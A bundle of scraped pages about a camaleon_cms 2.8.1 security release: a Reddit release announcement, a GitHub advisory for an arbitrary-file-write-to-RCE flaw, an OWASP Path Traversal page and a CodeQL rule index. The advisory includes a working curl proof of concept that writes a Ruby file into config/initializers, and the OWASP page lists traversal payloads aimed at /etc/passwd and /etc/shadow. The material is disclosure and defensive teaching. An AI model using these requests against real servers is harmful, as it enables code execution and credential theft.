=== Content from www.reddit.com_3b59bdd1_20250111_191338.html ===

[Skip to main content](#main-content)

Reddit and its partners use cookies and similar technologies to provide you with a better experience.

By accepting all cookies, you agree to our use of cookies to deliver and maintain our services and site, improve the quality of Reddit, personalize Reddit content and advertising, and measure the effectiveness of advertising.

By rejecting non-essential cookies, Reddit may still use certain cookies to ensure the proper functionality of our platform.

For more information, please see our
[Cookie Notice](https://reddit.com/en-us/policies/cookies)
and our
[Privacy Policy](https://reddit.com/en-us/policies/privacy-policy).

Open menu

Open navigation
Go to Reddit Home

r/rails

A chip

A close button

Get App

Get the Reddit app

[Log In](https://www.reddit.com/login/)Log in to Reddit

Expand user menu
Open settings menu

* [Log In / Sign Up](https://www.reddit.com/login/)
* [Advertise on Reddit](https://accounts.reddit.com/adsregister?utm_source=web3x_consumer&utm_name=user_menu_cta)
* [Shop Collectible Avatars](/avatar/shop)

[![r/rails icon](https://styles.redditmedia.com/t5_2qhjn/styles/communityIcon_1m29bruhgym11.jpg?format=pjpg&s=0d90c5d9023e3d474c817cf7a6d021874a5d2c38)

Go to rails](/r/rails/)

[r/rails](/r/rails/)
![r/rails icon](https://styles.redditmedia.com/t5_2qhjn/styles/communityIcon_1m29bruhgym11.jpg?format=pjpg&s=0d90c5d9023e3d474c817cf7a6d021874a5d2c38)

[r/rails](/r/rails/)

A subreddit for discussion and news about Ruby on Rails

---

Members

Online

•

[tvorogov](/user/tvorogov/)

ADMIN

MOD

# camaleon\_cms 2.8.1 has been released

**This release is fixing several security vulnerabilities! Please, upgrade ASAP!**

## What's Changed

* Replace sass-rails with dartsass-sprockets

  + Remove `sass` and `sass-rails` gems from the main app's Gemfile when upgrading `camaleon_cms` to this version
* Fix colorpicker missing admin asset, adding it to `admin-manifest.css`
* **Security fix:** Mitigate arbitrary path write in uploader (GHSL-2024-182)

  + Thanks [Peter Stöckli](https://github.com/p-) for reporting and providing clear reproduction steps
* Add Rails 7.2 to stable testing on CI, point rails\_edge to main branch
* **Security fix:** Mitigate arbitrary path traversal in download\_private\_file (GHSL-2024-183)

  + Thanks [Peter Stöckli](https://github.com/p-) for reporting and providing clear reproduction steps
* **Security fix:** Mitigate stored XSS through user file upload (GHSL-2024-184)

  + Thanks [Peter Stöckli](https://github.com/p-) for reporting and providing clear reproduction steps
* **Security fix:** Mitigate remote code execution through code injection (GHSL-2024-185)

  + Thanks [Peter Stöckli](https://github.com/p-) for reporting and providing clear reproduction steps
* **Security fix:** Mitigate arbitrary file delete vulnerability (GHSL-2024-186)

  + Thanks [Peter Stöckli](https://github.com/p-) for reporting and providing clear reproduction steps
* Use actions/checkout@v4 on CI to remove warning about deprecated Node JS version

**Full Changelog**: <https://github.com/owen2345/camaleon-cms/compare/2.8.0...2.8.1>

Read more

**Top 2%**
[Rank by size](https://www.reddit.com/best/communities/27/#t5_2qhjn/)

 Public

Anyone can view, post, and comment to this community

- &nbsp;

---

- TOPICS

- Internet Culture (Viral)

* [Amazing](https://reddit.com/t/amazing/)

* [Animals & Pets](https://reddit.com/t/animals_and_pets/)

* [Cringe & Facepalm](https://reddit.com/t/cringe_and_facepalm/)

* [Funny](https://reddit.com/t/funny/)

* [Interesting](https://reddit.com/t/interesting/)

* [Memes](https://reddit.com/t/memes/)

* [Oddly Satisfying](https://reddit.com/t/oddly_satisfying/)

* [Reddit Meta](https://reddit.com/t/reddit_meta/)

* [Wholesome & Heartwarming](https://reddit.com/t/wholesome_and_heartwarming/)

- Games

* [Action Games](https://reddit.com/t/action_games/)

* [Adventure Games](https://reddit.com/t/adventure_games/)

* [Esports](https://reddit.com/t/esports/)

* [Gaming Consoles & Gear](https://reddit.com/t/gaming_consoles_and_gear/)

* [Gaming News & Discussion](https://reddit.com/t/gaming_news_and_discussion/)

* [Mobile Games](https://reddit.com/t/mobile_games/)

* [Other Games](https://reddit.com/t/other_games/)

* [Role-Playing Games](https://reddit.com/t/role_playing_games/)

* [Simulation Games](https://reddit.com/t/simulation_games/)

* [Sports & Racing Games](https://reddit.com/t/sports_and_racing_games/)

* [Strategy Games](https://reddit.com/t/strategy_games/)

* [Tabletop Games](https://reddit.com/t/tabletop_games/)

- Q&As

* [Q&As](https://reddit.com/t/q_and_as/)

* [Stories & Confessions](https://reddit.com/t/stories_and_confessions/)

- Technology

* [3D Printing](https://reddit.com/t/3d_printing/)

* [Artificial Intelligence & Machine Learning](https://reddit.com/t/artificial_intelligence_and_machine_learning/)

* [Computers & Hardware](https://reddit.com/t/computers_and_hardware/)

* [Consumer Electronics](https://reddit.com/t/consumer_electronics/)

* [DIY Electronics](https://reddit.com/t/diy_electronics/)

* [Programming](https://reddit.com/t/programming/)

* [Software & Apps](https://reddit.com/t/software_and_apps/)

* [Streaming Services](https://reddit.com/t/streaming_services/)

* [Tech News & Discussion](https://reddit.com/t/tech_news_and_discussion/)

* [Virtual & Augmented Reality](https://reddit.com/t/virtual_and_augmented_reality/)

- Pop Culture

* [Celebrities](https://reddit.com/t/celebrities/)

* [Creators & Influencers](https://reddit.com/t/creators_and_influencers/)

* [Generations & Nostalgia](https://reddit.com/t/generations_and_nostalgia/)

* [Podcasts](https://reddit.com/t/podcasts/)

* [Streamers](https://reddit.com/t/streamers/)

* [Tarot & Astrology](https://reddit.com/t/tarot_and_astrology/)

- Movies & TV

* [Action Movies & Series](https://reddit.com/t/action_movies_and_series/)

* [Animated Movies & Series](https://reddit.com/t/animated_movies_and_series/)

* [Comedy Movies & Series](https://reddit.com/t/comedy_movies_and_series/)

* [Crime, Mystery, & Thriller Movies & Series](https://reddit.com/t/crime_mystery_and_thriller_movies_and_series/)

* [Documentary Movies & Series](https://reddit.com/t/documentary_movies_and_series/)

* [Drama Movies & Series](https://reddit.com/t/drama_movies_and_series/)

* [Fantasy Movies & Series](https://reddit.com/t/fantasy_movies_and_series/)

* [Horror Movies & Series](https://reddit.com/t/horror_movies_and_series/)

* [Movie News & Discussion](https://reddit.com/t/movie_news_and_discussion/)

* [Reality TV](https://reddit.com/t/reality_tv/)

* [Romance Movies & Series](https://reddit.com/t/romance_movies_and_series/)

* [Sci-Fi Movies & Series](https://reddit.com/t/scifi_movies_and_series/)

* [Superhero Movies & Series](https://reddit.com/t/superhero_movies_and_series/)

* [TV News & Discussion](https://reddit.com/t/tv_news_and_discussion/)

---

- RESOURCES

- [About Reddit](https://www.redditinc.com)
 - [Advertise](https://accounts.reddit.com/adsregister?utm_source=web3x_consumer&utm_name=left_nav_cta)
 - [Help](https://support.reddithelp.com/hc?utm_source=reddit&utm_medium=footer&utm_campaign=evergreen)
 - [Blog](https://redditblog.com/)
 - [Careers](https://www.redditinc.com/careers)
 - [Press](https://www.redditinc.com/press)

---

 - [Communities](https://www.reddit.com/best/communities/1/)
 - [Best of Reddit](https://www.reddit.com/posts/2025/global/)
 - [Topics](https://www.reddit.com/topics/a-1/)

---

 - [Content Policy](https://www.redditinc.com/policies/content-policy)
 - [Privacy Policy](https://www.reddit.com/policies/privacy-policy)
 - [User Agreement](https://www.redditinc.com/policies/user-agreement)

[Reddit, Inc. © 2025. All rights reserved.](https://redditinc.com)

close

# Don’t miss a thing from Reddit!

I agree to get emails about cool stuff on Reddit

Continue

close

# Log In

By continuing, you agree to our
[User Agreement](https://www.redditinc.com/policies/user-agreement)
and acknowledge that you understand the
[Privacy Policy](https://www.redditinc.com/policies/privacy-policy).

Continue with phone number

---

OR

---

Email or username

Password

Forgot password?

New to Reddit?
Sign Up

Log In

back

# Enter the 6-digit code from your authenticator app

You’ve set up two-factor authentication for this account.

Verification code

Lost access to your authenticator?
Use a backup code

Check code

back

# Enter a 6-digit backup code

You’ve set up two-factor authentication for this account.

Backup code

Don’t have access to your backup code?
Use a code from an authenticator app

Check code

close

# Sign Up

By continuing, you agree to our
[User Agreement](https://www.redditinc.com/policies/user-agreement)
and acknowledge that you understand the
[Privacy Policy](https://www.redditinc.com/policies/privacy-policy).

I agree to get emails about cool stuff on Reddit

Email

Already a redditor?
Log In

Continue

back

Skip

# Verify your email

Enter the 6-digit code we sent to

Verification code

Didn't get an email?
Resend

Continue

back

# Create your username and password

Reddit is anonymous, so your username is what you’ll go by here. Choose wisely—because once you get a name, you can’t change it.

Username

Password

Continue

close

# Sign Up

By continuing, you agree to our
[User Agreement](https://www.redditinc.com/policies/user-agreement)
and acknowledge that you understand the
[Privacy Policy](https://www.redditinc.com/policies/privacy-policy).

I agree to get emails about cool stuff on Reddit

Continue with phone number

---

OR

---

Email

Already a redditor?
Log In

Continue

back

Skip

# Verify your email

Enter the 6-digit code we sent to

Verification code

Didn't get an email?
Resend

Continue

back

# Create your username and password

Reddit is anonymous, so your username is what you’ll go by here. Choose wisely—because once you get a name, you can’t change it.

Username

Password

Continue

close

back

# Reset your password

Enter your email address or username and we’ll send you a link to reset your password

Email or username

[Need help?](https://reddithelp.com/hc/sections/360008917491-Account-Security)

Reset password

close

back

# Check your inbox

An email with a link to reset your password was sent to the email address associated with your account

Didn't get an email?

Resend

close

# Choose a Reddit account to continue

back

close

# Reset your password

New password

Confirm new password

Resetting your password will log you out on all devices.

Continue



=== Content from github.com_1ca4653b_20250111_191337.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fowen2345%2Fcamaleon-cms%2Fsecurity%2Fadvisories%2FGHSA-wmjg-vqhv-q5p5)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fowen2345%2Fcamaleon-cms%2Fsecurity%2Fadvisories%2FGHSA-wmjg-vqhv-q5p5)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=owen2345%2Fcamaleon-cms)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[owen2345](/owen2345)
/
**[camaleon-cms](/owen2345/camaleon-cms)**
Public

* [Notifications](/login?return_to=%2Fowen2345%2Fcamaleon-cms) You must be signed in to change notification settings
* [Fork
  288](/login?return_to=%2Fowen2345%2Fcamaleon-cms)
* [Star
   1.2k](/login?return_to=%2Fowen2345%2Fcamaleon-cms)

* [Code](/owen2345/camaleon-cms)
* [Issues
  14](/owen2345/camaleon-cms/issues)
* [Pull requests
  3](/owen2345/camaleon-cms/pulls)
* [Actions](/owen2345/camaleon-cms/actions)
* [Projects
  0](/owen2345/camaleon-cms/projects)
* [Wiki](/owen2345/camaleon-cms/wiki)
* [Security](/owen2345/camaleon-cms/security)
* [Insights](/owen2345/camaleon-cms/pulse)

Additional navigation options

* [Code](/owen2345/camaleon-cms)
* [Issues](/owen2345/camaleon-cms/issues)
* [Pull requests](/owen2345/camaleon-cms/pulls)
* [Actions](/owen2345/camaleon-cms/actions)
* [Projects](/owen2345/camaleon-cms/projects)
* [Wiki](/owen2345/camaleon-cms/wiki)
* [Security](/owen2345/camaleon-cms/security)
* [Insights](/owen2345/camaleon-cms/pulse)

# Arbitrary file write to RCE (GHSL-2024-182)

Critical

[owen2345](/owen2345)
published
GHSA-wmjg-vqhv-q5p5
Sep 18, 2024

## Package

bundler

2.8.0
([RubyGems](/advisories?query=ecosystem%3Arubygems))

## Affected versions

2.8.0

## Patched versions

2.8.2

## Description

An arbitrary file write vulnerability accessible via the upload method of the MediaController allows authenticated users to write arbitrary files to any location on the web server Camaleon CMS is running on (depending on the permissions of the underlying filesystem). E.g. This can lead to a delayed remote code execution in case an attacker is able to write a Ruby file into the config/initializers/ subfolder of the Ruby on Rails application.

Once a user upload is started via the [upload](https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/controllers/camaleon_cms/admin/media_controller.rb#L86-L87) method, the file\_upload and the folder parameter

```
def upload(settings = {})
  params[:dimension] = nil if params[:skip_auto_crop].present?
  f = { error: 'File not found.' }
  if params[:file_upload].present?
    f = upload_file(params[:file_upload],
                    { folder: params[:folder], dimension: params['dimension'], formats: params[:formats], versions: params[:versions],
                      thumb_size: params[:thumb_size] }.merge(settings))
  end
  [..]
end
```

are passed to the [upload\_file](https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/helpers/camaleon_cms/uploader_helper.rb#L23-L24) method. Inside that method the given settings are [merged](https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/helpers/camaleon_cms/uploader_helper.rb#L41-L42) with some presets. The file format is [checked against](https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/helpers/camaleon_cms/uploader_helper.rb#L61-L62) the formats settings we can override with the formats parameters.

```
# formats validations
  return { error: "#{ct('file_format_error')} (#{settings[:formats]})" } unless cama_uploader.class.validate_file_format(
    uploaded_io.path, settings[:formats]
 )
```

Our given folder is then [passed unchecked](https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/helpers/camaleon_cms/uploader_helper.rb#L73-L74) to the Cama\_uploader:

```
key = File.join(settings[:folder], settings[:filename]).to_s.cama_fix_slash
res = cama_uploader.add_file(settings[:uploaded_io], key, { same_name: settings[:same_name] })
```

In the [add\_file](https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/uploaders/camaleon_cms_local_uploader.rb#L77) method of CamaleonCmsLocalUploader this key argument containing the unchecked path is then used to write the file to the file system:

```
def add_file(uploaded_io_or_file_path, key, args = {})
  [..]
  upload_io = uploaded_io_or_file_path.is_a?(String) ? File.open(uploaded_io_or_file_path) : uploaded_io_or_file_path
  File.open(File.join(@root_folder, key), 'wb') { |file| file.write(upload_io.read) }
  [..]
end
```

Proof of concept

Precondition: A valid account of a registered user is required. (The values for auth\_token and \_cms\_session need to be replaced with authenticated values in the curl command below)

curl --path-as-is -i -s -k -X $'POST'

-H $'User-Agent: Mozilla/5.0' -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary80dMC9jX3srWAsga' -H $'Accept: */*' -H $'Connection: keep-alive'

-b $'auth\_token=[..]; \_cms\_session=[..]'

--data-binary $'------WebKitFormBoundary80dMC9jX3srWAsga\x0d\x0aContent-Disposition: form-data; name="file\_upload"; filename="test.rb"\x0d\x0aContent-Type: text/x-ruby-script\x0d\x0a\x0d\x0aputs "================================="\x0aputs "================================="\x0aputs "= COMPROMISED ="\x0aputs "================================="\x0aputs "================================="\x0d\x0a------WebKitFormBoundary80dMC9jX3srWAsga\x0d\x0aContent-Disposition: form-data; name="folder"\x0d\x0a\x0d\x0a../../../config/initializers/\x0d\x0a------WebKitFormBoundary80dMC9jX3srWAsga\x0d\x0aContent-Disposition: form-data; name="skip\_auto\_crop"\x0d\x0a\x0d\x0atrue\x0d\x0a------WebKitFormBoundary80dMC9jX3srWAsga--\x0d\x0a'

$'https:///admin/media/upload?actions=false'

Note that the upload form field formats was removed so that Camaleon CMS accepts any file. The folder was set to ../../../config/initializers/so that following Ruby script is written into the initializers folder of the Rails web app:

puts "================================="

puts "================================="

puts "= COMPROMISED ="

puts "================================="

puts "================================="

Once Camaleon CMS is restarted following output will be visible in the log:

### COMPROMISED

Impact

This issue may lead up to Remote Code Execution (RCE) via arbitrary file write.

Remediation

Normalize file paths constructed from untrusted user input before using them and check that the resulting path is inside the targeted directory. Additionally, do not allow character sequences such as .. in untrusted input that is used to build paths.

See also:

[CodeQL: Uncontrolled data used in path expression](https://codeql.github.com/codeql-query-help/ruby/rb-path-injection/)

[OWASP: Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

### Severity

Critical

### CVE ID

CVE-2024-46986

### Weaknesses

[CWE-22](/advisories?query=cwe%3A22)

### Credits

* [![@texpert](https://avatars.githubusercontent.com/u/2990033?s=40&v=4)](/texpert)
  [texpert](/texpert)
  Remediation developer

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from owasp.org_d20c511b_20250111_191337.html ===


For full functionality of this site it is necessary to enable JavaScript. Here are the  [instructions how to enable JavaScript in your web browser](http://turnonjs.com/).

[![OWASP logo](https://owasp.org/assets/images/logo.png)](https://owasp.org/)

[![](https://owasp.org/assets/images/logo.png)](https://owasp.org/)

 [Store](https://owasp.org/store)
[Donate](https://owasp.org/donate?reponame=www-community)
[Join](https://owasp.org/membership)

This website uses cookies to analyze our traffic and only share that information with our analytics partners.

Accept

x

[Store](https://owasp.org/store)
[Donate](https://owasp.org/donate?reponame=www-community)
[Join](https://owasp.org/membership)

# Path Traversal

## Overview

A path traversal attack (also known as directory traversal) aims to
access files and directories that are stored outside the web root
folder. By manipulating variables that reference files with
“dot-dot-slash (../)” sequences and its variations or by using
absolute file paths, it may be possible to access arbitrary files and
directories stored on file system including application source code or
configuration and critical system files. It should be noted that access
to files is limited by system operational access control (such as in the
case of locked or in-use files on the Microsoft Windows operating
system).

This attack is also known as “dot-dot-slash”, “directory traversal”,
“directory climbing” and “backtracking”.

## Related Security Activities

### How to Avoid Path Traversal Vulnerabilities

All but the most simple web applications have to include local resources, such as images, themes, other scripts, and so on. Every time a resource or file is included by the application, there is a risk that an attacker may be able to include a file or remote resource you didn’t authorize.

#### How to identify if you are vulnerable

* Be sure you understand how the underlying operating system will process filenames handed off to it.
* Don’t store sensitive configuration files inside the web root
* For Windows IIS servers, the web root should not be on the system disk, to prevent recursive traversal back to system directories.

#### How to protect yourself

* Prefer working without user input when using file system calls
* Use indexes rather than actual portions of file names when templating or using language files (ie value 5 from the user submission = Czechoslovakian, rather than expecting the user to return “Czechoslovakian”)
* Ensure the user cannot supply all parts of the path – surround it with your path code
* Validate the user’s input by only accepting known good – do not sanitize the data
* Use chrooted jails and code access policies to restrict where the files can be obtained or saved to
* If forced to use user input for file operations, normalize the input before using in file io API’s, such as [normalize()](http://docs.oracle.com/javase/7/docs/api/java/net/URI.html#normalize()).

### How to Test for Path Traversal Vulnerabilities

See the [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) article on how to
[test for path traversal vulnerabilities](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include.md).

## Description

### Request variations

Encoding and double encoding:

* `%2e%2e%2f` represents `../`
* `%2e%2e/` represents `../`
* `..%2f` represents `../`
* `%2e%2e%5c` represents `..\`
* `%2e%2e\` represents `..\`
* `..%5c` represents `..\`
* `%252e%252e%255c` represents `..\`
* `..%255c` represents `..\`

and so on.

#### Percent encoding (aka URL encoding)

Note that web containers perform one level of decoding on percent
encoded values from forms and URLs.

* `..%c0%af` represents `../`
* `..%c1%9c` represents `..\`

#### OS specific

UNIX

```
Root directory:  “ / “
Directory separator: “ / “

```

WINDOWS

```
Root directory: “  <partition letter> : \ “
Directory separator: “ / “ or “ \ ”
Note that windows allows filenames to be followed by extra . \ / characters.

```

In many operating systems, null bytes `%00` can be injected to terminate the filename. For example, sending a parameter like:

`?file=secret.doc%00.pdf`

will result in the Java application seeing a string that ends with “.pdf” and the operating system will see a file that ends in “.doc”. Attackers may use this trick to bypass validation routines.

## Examples

### Example 1

The following examples show how the application deals with the resources in use.

```
http://some_site.com.br/get-files.jsp?file=report.pdf
http://some_site.com.br/get-page.php?home=aaa.html
http://some_site.com.br/some-page.asp?page=index.html

```

In these examples it’s possible to insert a malicious string as the
variable parameter to access files located outside the web publish
directory.

```
http://some_site.com.br/get-files?file=../../../../some dir/some file
http://some_site.com.br/../../../../some dir/some file

```

The following URLs show examples of \*NIX password file exploitation.

```
http://some_site.com.br/../../../../etc/shadow
http://some_site.com.br/get-files?file=/etc/passwd

```

Note: In a Windows system an attacker can navigate only in a partition
that locates web root while in the Linux they can navigate in the whole
disk.

### Example 2

It’s also possible to include files and scripts located on external
website.

`http://some_site.com.br/some-page?page=http://other-site.com.br/other-page.htm/malicius-code.php`

### Example 3

These examples illustrate a case when an attacker made the server show
the CGI source code.

`http://vulnerable-page.org/cgi-bin/main.cgi?file=main.cgi`

### Example 4

This example was extracted from: [Wikipedia - Directory Traversal](https://en.wikipedia.org/wiki/Directory_traversal_attack#Example)

A typical example of vulnerable application code is:

```
<?php
$template = 'blue.php';
if ( is_set( $_COOKIE['TEMPLATE'] ) )
   $template = $_COOKIE['TEMPLATE'];
include ( "/home/users/phpguru/templates/" . $template );
?>

```

An attack against this system could be to send the following HTTP
request:

```
GET /vulnerable.php HTTP/1.0
Cookie: TEMPLATE=../../../../../../../../../etc/passwd

```

Generating a server response such as:

```
HTTP/1.0 200 OK
Content-Type: text/html
Server: Apache

root:fi3sED95ibqR6:0:1:System Operator:/:/bin/ksh
daemon:*:1:1::/tmp:
phpguru:f8fk3j1OIf31.:182:100:Developer:/home/users/phpguru/:/bin/csh

```

The repeated `../` characters after `/home/users/phpguru/templates/` has
caused [include()](http://www.php.net/manual/en/function.include.php) to
traverse to the root directory, and then include the UNIX password file
`/etc/passwd`.

UNIX `etc/passwd` is a common file used to demonstrate **directory
traversal**, as it is often used by crackers to try cracking the
passwords.

### Absolute Path Traversal

The following URLs may be vulnerable to this attack:

```
http://testsite.com/get.php?f=list
http://testsite.com/get.cgi?f=2
http://testsite.com/get.asp?f=test

```

An attacker can execute this attack like this:

```
http://testsite.com/get.php?f=/var/www/html/get.php
http://testsite.com/get.cgi?f=/var/www/html/admin/get.inc
http://testsite.com/get.asp?f=/etc/passwd

```

When the web server returns information about errors in a web
application, it is much easier for the attacker to guess the correct
locations (e.g. path to the file with a source code, which then may be
displayed).

## Related [Attacks](https://owasp.org/www-community/attacks/)

* [Path Manipulation](https://wiki.owasp.org/index.php/Path_Traversal)
* [Relative Path Traversal](https://wiki.owasp.org/index.php/Path_Traversal)
* [Resource Injection](https://owasp.org/www-community/attacks/Resource_Injection)

## Related [Vulnerabilities](https://owasp.org/www-community/vulnerabilities/)

* [Improper Data Validation](https://owasp.org/www-community/vulnerabilities/Improper_Data_Validation)

## Related [Controls](https://owasp.org/www-community/controls/)

* [Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)

## References

* <http://cwe.mitre.org/data/definitions/22.html>
* <http://www.webappsec.org/projects/threat/classes/path_traversal.shtml>

---

[Watch](https://github.com/owasp/www-community/subscription)
[Star](https://github.com/owasp/www-community)

**The OWASP® Foundation** works to improve the security of software through its community-led open source software projects,
hundreds of chapters worldwide, tens of thousands of members, and by hosting local and global conferences.
### Important Community Links

* [Community](/www-community/)
* Attacks (You are here)
* [Vulnerabilities](/www-community/vulnerabilities)
* [Controls](/www-community/controls)

### Upcoming OWASP Global Events

## Corporate Supporters

[Become a corporate supporter](https://owasp.org/supporters)

* [HOME](https://owasp.org/)
* [PROJECTS](https://owasp.org/projects/)
* [CHAPTERS](https://owasp.org/chapters/)
* [EVENTS](https://owasp.org/events/)
* [ABOUT](https://owasp.org/about/)
* [PRIVACY](https://owasp.org/www-policy/operational/privacy)
* [SITEMAP](https://owasp.org/sitemap/)
* [CONTACT](https://owasp.org/contact/)

OWASP, the OWASP logo, and Global AppSec are registered trademarks and AppSec Days, AppSec California, AppSec Cali, SnowFROC, and LASCON are trademarks of the OWASP Foundation, Inc. Unless otherwise specified, all content on the site is Creative Commons Attribution-ShareAlike v4.0 and provided without warranty of service or accuracy. For more information, please refer to our [General Disclaimer](/www-policy/operational/general-disclaimer.html). OWASP does not endorse or recommend commercial products or services, allowing our community to remain vendor neutral with the collective wisdom of the best minds in software security worldwide. Copyright 2025, OWASP Foundation, Inc.



=== Content from codeql.github.com_4324004b_20250111_191336.html ===

[CodeQL documentation](https://codeql.github.com/docs)

CodeQL resources

* [CodeQL overview](https://codeql.github.com/docs/codeql-overview)
CodeQL guides
* [Writing CodeQL queries](https://codeql.github.com/docs/writing-codeql-queries)
* [CodeQL language guides](https://codeql.github.com/docs/codeql-language-guides)
  Reference docs
  * [QL language
    reference](https://codeql.github.com/docs/ql-language-reference/)* [CodeQL
      standard-libraries](https://codeql.github.com/codeql-standard-libraries)* [CodeQL
        query help](https://codeql.github.com/codeql-query-help)
        Source files
        * [CodeQL repository](https://github.com/github/codeql)
          Academic
          * [QL publications](https://codeql.github.com/publications)

* [CodeQL query help for C and C++](../../cpp/)
* [CodeQL query help for C#](../../csharp/)
* [CodeQL query help for Go](../../go/)
* [CodeQL query help for Java and Kotlin](../../java/)
* [CodeQL query help for JavaScript and TypeScript](../../javascript/)
* [CodeQL query help for Python](../../python/)
* [CodeQL query help for Ruby](../)
  + [Bad HTML filtering regexp](../rb-bad-tag-filter/)
  + [Badly anchored regular expression](../rb-regex-badly-anchored-regexp/)
  + [CSRF protection not enabled](../rb-csrf-protection-not-enabled/)
  + [CSRF protection weakened or disabled](../rb-csrf-protection-disabled/)
  + [Clear-text logging of sensitive information](../rb-clear-text-logging-sensitive-data/)
  + [Clear-text storage of sensitive information](../rb-clear-text-storage-sensitive-data/)
  + [Code injection](../rb-code-injection/)
  + [Dependency download using unencrypted communication channel](../rb-insecure-dependency/)
  + [Deserialization of user-controlled data](../rb-unsafe-deserialization/)
  + [Download of sensitive file through insecure connection](../rb-insecure-download/)
  + [Hard-coded credentials](../rb-hardcoded-credentials/)
  + [Hard-coded data interpreted as code](../rb-hardcoded-data-interpreted-as-code/)
  + [Incomplete URL substring sanitization](../rb-incomplete-url-substring-sanitization/)
  + [Incomplete multi-character sanitization](../rb-incomplete-multi-character-sanitization/)
  + [Incomplete regular expression for hostnames](../rb-incomplete-hostname-regexp/)
  + [Incomplete string escaping or encoding](../rb-incomplete-sanitization/)
  + [Inefficient regular expression](../rb-redos/)
  + [Information exposure through an exception](../rb-stack-trace-exposure/)
  + [Insecure Mass Assignment](../rb-insecure-mass-assignment/)
  + [Log injection](../rb-log-injection/)
  + [Missing regular expression anchor](../rb-regex-missing-regexp-anchor/)
  + [Network data written to file](../rb-http-to-file-access/)
  + [Overly permissive regular expression range](../rb-overly-large-range/)
  + [Polynomial regular expression used on uncontrolled data](../rb-polynomial-redos/)
  + [Reflected server-side cross-site scripting](../rb-reflected-xss/)
  + [Regular expression injection](../rb-regexp-injection/)
  + [Request without certificate validation](../rb-request-without-cert-validation/)
  + [SQL query built from user-controlled sources](../rb-sql-injection/)
  + [Sensitive data read from GET request](../rb-sensitive-get-query/)
  + [Server-side request forgery](../rb-request-forgery/)
  + [Stored cross-site scripting](../rb-stored-xss/)
  + [URL redirection from remote source](../rb-url-redirection/)
  + [Uncontrolled command line](../rb-command-line-injection/)
  + Uncontrolled data used in path expression
  + [Unsafe HTML constructed from library input](../rb-html-constructed-from-input/)
